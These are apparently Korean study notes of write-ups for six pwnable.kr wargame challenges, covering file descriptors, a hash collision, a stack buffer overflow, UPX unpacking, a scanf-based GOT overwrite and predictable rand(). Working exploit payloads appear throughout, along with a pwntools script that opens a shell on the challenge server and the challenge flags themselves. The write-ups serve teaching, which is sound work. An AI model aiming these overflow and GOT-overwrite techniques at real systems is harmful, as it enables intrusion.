
#Pwnable.kr 문제 풀이
-------
1. https://icmp-ycdi.tistory.com/48
    ```cpp
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    char buf[32];
    int main(int argc, char* argv[], char* envp[]){
            if(argc<2){
                    printf("pass argv[1] a number\n");
                    return 0;
            }
            int fd = atoi( argv[1] ) - 0x1234;
            int len = 0;
            len = read(fd, buf, 32);
            if(!strcmp("LETMEWIN\n", buf)){
                    printf("good job :)\n");
                    system("/bin/cat flag");
                    exit(0);
            }
            printf("learn about Linux file IO\n");
            return 0;

    }
    ```
   - 리눅스 File descriptor 응용
   - ssize_t read (int fd, void *buf, size_t nbytes)
   - fd의 경우 0: 표준입력, 1: 표준출력, 2: 표준에러
   - 표준입력을 받을 수 있도록 해야 flag가 표시됨
   - 고로 인자로 0x1234 -> 4660 입력 후 LETMEWIN 입력
   - cat flag를 하면 permission denied가 발생하지만, system 함수는 터미널 제어권을 루트 권한으로 가져갈 수 있는 함수이므로 매우 강력하게 사용될 수 있음. (Command Injection)
   - https://velog.io/@aqaqsubin/Linux-system-%EB%AC%B8%EC%A0%9C%EC%A0%90
  <br/>


1. https://icmp-ycdi.tistory.com/49
    ```Cpp
    #include
    #include
    unsigned long hashcode = 0x21DD09EC;
    unsigned long check_password(const char* p){
        int* ip = (int*)p;
        int i;
        int res=0;
        for(i=0; i<5; i++){
            res += ip[i];
        }
        return res;
    }

    int main(int argc, char* argv[]){
        if(argc<2){
            printf("usage : %s [passcode]\n", argv[0]);
            return 0;
        }
        if(strlen(argv[1]) != 20){
            printf("passcode length should be 20 bytes\n");
            return 0;
        }

        if(hashcode == check_password( argv[1] )){
            system("/bin/cat flag");
            return 0;
        }
        else
            printf("wrong passcode.\n");
        return 0;
    }
    ```

   - 입력한 데이터가 최종적으로 0x21DD09EC가 되도록
   - res = ip[0] + ip[1] + ip[2] + ip[3] + ip[4]
   - 20바이트의 문자열을 4바이트씩 나누어서 5번 res에 저장
   - ip[0] + ip[1] + ip[2] + ip[3] + ip[4] 의 결과가 0x21DD09EC가 되어야 함.
   - 가장 쉬운방법은 0x21DD09EC을 5로 나눈 결과값은 0x6C5CEC8을 네번, 이후 0x6C5CECC 입력해야 함
   - 0x21DD09EC를 입력하고 0x00000000을 입력하려고 할수도 있지만 ascii 코드 상 09가 Tab이므로 console 상 입력하려면 문제가 생길 수 있음.
   - 고로 가장 쉬운 방법을 따르자면 아래와 같음 (ascii 코드 상 문제만 없으면 숫자는 바뀔 수 있음.)
   - ./col `python -c 'print "\xC8\xCE\xC5\x06"*4+"\xcc\xce\xc5\x06"'`
   - 단 x86 시스템은 Little endian 을 사용하기 때문에 위와 같이 입력해줘야 함.
   - 참고로 python에서 print "\x41" 을 출력하면 ASCII값을 기준으로 A를 출력하므로 참고할 것<br/>


3. https://icmp-ycdi.tistory.com/50
   - 버퍼 오버플로우를 이용한 문제.
   - nc를 이용해 문제를 품, ssh가 아닌 cat으로 값을 넘겨줌
   - Nana told me that buffer overflow is one of the most common software vulnerability. Is that true?

   - Download : http://pwnable.kr/bin/bof
   - Download : http://pwnable.kr/bin/bof.c
   - Running at : nc pwnable.kr 9000

   - wget http://pwnable.kr/bin/bof
   - wget http://pwnable.kr/bin/bof.c
   - 상기 두 파일을 다운로드, 파일 내용은 아래와 같음.
   ```Cpp
   #include <stdio.h>
   #include <string.h>
   #include <stdlib.h>
   
   void func(int key){
       char overflowme[32];
       printf("overflow me : ");                                                        
       gets(overflowme);    // smash me!
       if(key == 0xcafebabe){
           system("/bin/sh");
       }
       else{
           printf("Nah..\n");
       }
   }
   
   int main(int argc, char* argv[]){
       func(0xdeadbeef);
       return 0;
   }
   ```
   - key 값을 0xcafebabe로 만들어야 함.
   - 즉 bof 실행 프로그램의 구조를 정확하게 파악해야함 (gdb 사용)
   - https://mintnlatte.tistory.com/581 (gdb 명령어 정리)
   - gdb의 disas 명령어를 통해 assmebly 
   - gdb bof 를 통해 gdb를 실행한 후 아래와 같은 명령어를 통해 각 함수의 메모리 덤프를 땀.
   - disas main
   ```
   Dump of assembler code for function main:
   0x0000068a <+0>:	push   %ebp
   0x0000068b <+1>:	mov    %esp,%ebp
   0x0000068d <+3>:	and    $0xfffffff0,%esp
   0x00000690 <+6>:	sub    $0x10,%esp
   0x00000693 <+9>:	movl   $0xdeadbeef,(%esp) <- 키 값
   0x0000069a <+16>:	call   0x62c <func> <---func 호출
   0x0000069f <+21>:	mov    $0x0,%eax
   0x000006a4 <+26>:	leave  
   0x000006a5 <+27>:	ret    
   End of assembler dump.
   ```
   - disas func
   ```
   Dump of assembler code for function func:
   0x0000062c <+0>:	push   %ebp
   0x0000062d <+1>:	mov    %esp,%ebp
   0x0000062f <+3>:	sub    $0x48,%esp
   0x00000632 <+6>:	mov    %gs:0x14,%eax
   0x00000638 <+12>:	mov    %eax,-0xc(%ebp)
   0x0000063b <+15>:	xor    %eax,%eax
   0x0000063d <+17>:	movl   $0x78c,(%esp)
   0x00000644 <+24>:	call   0x645 <func+25> <-- printf
   0x00000649 <+29>:	lea    -0x2c(%ebp),%eax <--overflowme
   0x0000064c <+32>:	mov    %eax,(%esp)
   0x0000064f <+35>:	call   0x650 <func+36> <---gets
   0x00000654 <+40>:	cmpl   $0xcafebabe,0x8(%ebp) <-- compare (if문)
   0x0000065b <+47>:	jne    0x66b <func+63>
   0x0000065d <+49>:	movl   $0x79b,(%esp)
   0x00000664 <+56>:	call   0x665 <func+57>
   0x00000669 <+61>:	jmp    0x677 <func+75>
   0x0000066b <+63>:	movl   $0x7a3,(%esp)
   0x00000672 <+70>:	call   0x673 <func+71>
   0x00000677 <+75>:	mov    -0xc(%ebp),%eax
   0x0000067a <+78>:	xor    %gs:0x14,%eax
   0x00000681 <+85>:	je     0x688 <func+92>
   0x00000683 <+87>:	call   0x684 <func+88>
   0x00000688 <+92>:	leave  
   0x00000689 <+93>:	ret    
   End of assembler dump.
   ```
   - 여기서 문제의 힌트는 gets 함수를 이용해 공격하라고 함.
   - gets 함수는 읽어들일 문자열의 양이 지정되지 않았기 떄문에 overflow를 발생시키기 충분함. gets로 받는 주소는 overflowme[32]
   - overflowme와 key의 주소를 정확하게 파악하여 원하는 값을 넣는것이 관건
   - key의 주소는 쉽게 유추 가능함. if문 기준으로 0x8(%ebp)가 key의 위치, 이때 gdb에서의 해당 의미는 %ebp + 8위치
   - http://ehpub.co.kr/gets-%ED%95%A8%EC%88%98/
   - gets함수는 인자로 문자열을 저장할 버퍼 주소가 들어가는데, 이때 값을 받기 이전에 인자를 정리하기 위한 부분이 mov -0x2c(%ebp), eax 임.
   - 즉 overflowme의 시작 주소는 %ebp - 0x2c
   - 즉 0x2c + 8 = 0x34 byte만큼의 offset이 존재하므로 dword 기준 52개 이후 0xcafebabe를 입력해야 함.
   - 이때 bof 의 내용으로 보면, 실제 함수 실행시 인자로 (argv) 값을 넣어주는게 아닌 gets로 실행함.
   - 이때 문제에서 주어진 힌트인 pwnable.kr에 nc(netcat)으로 접근 
   - https://whackur.tistory.com/166
   - 이때 정방향 쉘 연결을 이용해 공격
   - (python -c 'print "A"*52 + "\xbe\xba\xfe\xca"';cat) | nc pwnable.kr 9000
   - cat flag -> daddy, I just pwned a buFFer :)
   - 이때 이 nc 의 기능은 파이썬  pwntools 에서도 사용 가능
   - pip install pwntools
   ```Python
   #!/usr/bin/python
   from pwn import *

   payload = 'A' * 52 + '\xbe\xba\xfe\xca'
   shell = remote('pwnable.kr',9000)
   shell.send(payload)
   shell.interactive()
   ```
   - 상기와 같이 공격하는 방법도 존재함.<br/>

4. https://icmp-ycdi.tistory.com/51

    - Papa brought me a packed present! let's open it.
    - Download : http://pwnable.kr/bin/flag
    - This is reversing task. all you need is binary
    - 리버싱 문제
    - wget http://pwnable.kr/bin/flag
    - I will malloc() and strcpy the flag there. take it.
    - 3번과 유사한 문제로 추정하여 gdb로 disas 시도
    - Reading symbols from flag...
      (No debugging symbols found in flag) -> 일반 c 파일이 아닌것으로 보임
    - 다른 풀이들을 보니 Packing(압축, 암호화)된 파일로써 Unpacking을 수행해야 한다고 함.
    - Packing 여부는 아래와 같이 Ghidra와 같은 툴이나 ExeInfo와 같은 툴로 확인 할 수 있다.
    - Ghidra<br/>
    ![Ghidra](Image/Q4/UPX.png)
    - ExeInfo : https://github.com/ExeinfoASL/ASL<br/>
    ![ExeInfo](Image/Q4/Unpacking.png)
    - UPX로 Packing 되었다는 것을 확인했으니 Upx 패키지를 설치하여 Unpacking을 시도한다. (Parrot OS에는 내장되어 있음.)
    - upx -d ./flag
    ![upx](Image/Q4/UPX_Unpack.png)
    ![disas](Image/Q4/disas_flag.png)
    - puts에 들어갈 문자열 주소는 %edi 레지스터에 저장된것으로 보이며, 해당 주소는 0x496658로 보임
    - (gdb) x/s 0x496658
    - 0x496658:	"I will malloc() and strcpy the flag there. take it."
    - flag 프로그램을 출력할때 나오는 문자열이 출력됨.
    - 디컴파일러를 통해 더 쉽게 볼수 있음 (ghidra)
    ![decomp](Image/Q4/Decompiler_flag.png)
    - thunk_FUN_00400326(pvVar1,flag); 이 핵심, flag 변수를 찾기 위해 해당 Disassembly 주소로 접근
    - 0x496628이 수상하여 해당 내용을 gdb의 x/s로 접근하면 
    - (gdb) x/s 0x496628
    - 0x496628:	"UPX...? sounds like a delivery service :)"
    - 기드라 사용이 불가능하다면 gdb로 디버깅해야함.
    -    0x0000000000401184 <+32>:	mov    0x2c0ee5(%rip),%rdx        # 0x6c2070 <flag>
    - 하지만 위와 같이 flag변수가 보일 수 있으니 안심하고 접근 가능함.
    - 최종적으로 packing & unpacking 툴과 disassembly 툴을 잘 구비하면 분석이 가능하다.<br/>


5. https://icmp-ycdi.tistory.com/52
   - passcode
    ```
    Mommy told me to make a passcode based login system.
    My initial C code was compiled without any error!
    Well, there was some compiler warning, but who cares about that?

    ssh passcode@pwnable.kr -p2222 (pw:guest)
    ```
    ![ssh](Image/Q5/ssh.png)

    ```Cpp
    #include <stdio.h>
    #include <stdlib.h>

    void login(){
    	int passcode1;
    	int passcode2;

    	printf("enter passcode1 : ");
    	scanf("%d", passcode1);
    	fflush(stdin);

    	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
    	printf("enter passcode2 : ");
            scanf("%d", passcode2);

    	printf("checking...\n");
    	if(passcode1==338150 && passcode2==13371337){
                    printf("Login OK!\n");
                    system("/bin/cat flag");
            }
            else{
                    printf("Login Failed!\n");
    		exit(0);
            }
    }

    void welcome(){
    	char name[100];
    	printf("enter you name : ");
    	scanf("%100s", name);
    	printf("Welcome %s!\n", name);
    }

    int main(){
    	printf("Toddler's Secure Login System 1.0 beta.\n");

    	welcome();
    	login();

    	// something after login...
    	printf("Now I can safely trust you that you have credential :)\n");
    	return 0;	
    }
    ```
    - 위의 코드대로 password를 입력하니 segfault가 발생함
    ![ssh](Image/Q5/segfault.png)
    - 이유는 scanf시 저장할 대상 인자에 &가 없어서 발생하는것으로 보임.
    - 즉 대상 address가 아닌 대상 자체의 값을 address로 쓰기 때문임
    - 그렇다면 passcode1과 passcode2에 적절한 주소 값을 주고 passcode를 입력하면 문제가 없을것으로 보임
    ![disas](Image/Q5/disas.png)
    ![stack](Image/Q5/stack.png)
    - 이름을 입력하는 변수의 위치는 EBP + -0x70
    - 두 패스워드의 기준 address 는 mov -0x10(%ebp),%edx
    - 최종적으로 두 변수의 메모리 offset은 0x60만큼 -> 96만큼 존재
    - 그러나 char name[100];의 크기만큼 입력 칸 존재!
    - printf로 passcode1의 주소 공간 만큼 덮을 수 있음, 그런데 넣을 주소값은 어떻게 판단하는가?
    - https://bbolmin.tistory.com/33
    - 이를 판단하기 위해서는 PLT와 GOT에 대해 이해할 수 있어야 함.
    - 간단히 설명하자면 PLT에 담겨진 시스템 라이브러리 호출 시 GOT에 저장된 프로시저의 주소를 확인해야 함.
    ![stack](Image/Q5/got.png)
    - 코드를 다시 분석하면 
    ```Cpp
        printf("enter passcode1 : ");
    	scanf("%d", passcode1);
    	fflush(stdin);

    	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
    	printf("enter passcode2 : ");
            scanf("%d", passcode2);

    	printf("checking...\n");
    	if(passcode1==338150 && passcode2==13371337){
                    printf("Login OK!\n");
                    system("/bin/cat flag");
            }
            else{
                    printf("Login Failed!\n");
    		exit(0);
            }
    ```
    - scanf 이후에 실핻되는 함수는 fflush임.
    - 그러나 plt와 got를 이용하자면
        1. Password1에 fflush의 GOT 주소를 지정 (char[100]을 이용)
        2. 이후 Password1 scanf를 받을 때 GOT 주소를 변경하게 되므로 system 함수의 GOT 주소를 입력하면 해결이 가능함.
    - fflush 주소 (gdb) x/i 0x8048430
   0x8048430 <fflush@plt>:	jmp    *0x804a004
    - system 프로시저 주소 (gdb) x/i 0x8048460
   0x8048460 <system@plt>:	jmp    *0x804a010
    - 그러나 system 프로시저 주소에 직접 접근하지 말고, system에 명령어를 옮겨 넣는 0x080485e3 <+127>:	movl   $0x80487af,(%esp) 위치로 이동해야함.
    - 고로 아래와 같이 풀 수 있음<br/>
    ![solve](Image/Q5/solve.png)<br/>
    <br/>


    1. https://icmp-ycdi.tistory.com/61

    - Daddy, teach me how to use random value in programming!
        ssh random@pwnable.kr -p2222 (pw:guest)
    
    ```Cpp
    #include <stdio.h>

    int main(){
            unsigned int random;
            random = rand();        // random value!

            unsigned int key=0;
            scanf("%d", &key);

            if( (key ^ random) == 0xdeadbeef ){
                    printf("Good!\n");
                    system("/bin/cat flag");
                    return 0;
            }

            printf("Wrong, maybe you should try 2^32 cases.\n");
            return 0;
    }
    ```
    - rand의 값을 찾아야함!
    - rand함수의 random 값은 컴파일 시 값이 정해짐 
    - srand는 이를 보안하기 위해 seed 값을 이용해 값을 변화시킬 수 있음.
    - 이미 컴파일된 rand의 값을 찾기 위해 gdb의 breakpoint 이용
    ```shell
    0x00000000004005f4 <+0>:	push   %rbp
    0x00000000004005f5 <+1>:	mov    %rsp,%rbp
    0x00000000004005f8 <+4>:	sub    $0x10,%rsp
    0x00000000004005fc <+8>:	mov    $0x0,%eax
    0x0000000000400601 <+13>:	call   0x400500 <rand@plt>
    0x0000000000400606 <+18>:	mov    %eax,-0x4(%rbp)
    0x0000000000400609 <+21>:	movl   $0x0,-0x8(%rbp)
    0x0000000000400610 <+28>:	mov    $0x400760,%eax
    ```
    - rand함수의 결과를 eax 레지스터로부터 400760에 저장하는것으로 보임
    - 이를 확인하기 위해 eax 값을 0x400760에 저장하기 전에 break를 걸고 eax 레지스터 값을 확인함.
    ```shell
    (gdb) b* 0x0000000000400609
    Breakpoint 1 at 0x400609
    (gdb) r
    Starting program: /home/parrot/Desktop/Q5/random 

    Breakpoint 1, 0x0000000000400609 in main ()
    (gdb) info register $eax
    eax            0x6b8b4567          1804289383
    ```
    - 0x6B8B4567과 KEY 값의 xor 연산의 결과가 0xdeadbeef
    - key 값은 0xb526fb88 = 3039230856
    ```shell
    random@pwnable:~$ ./random 
    3039230856
    Good!
    Mommy, I thought libc random is unpredictable...
    ```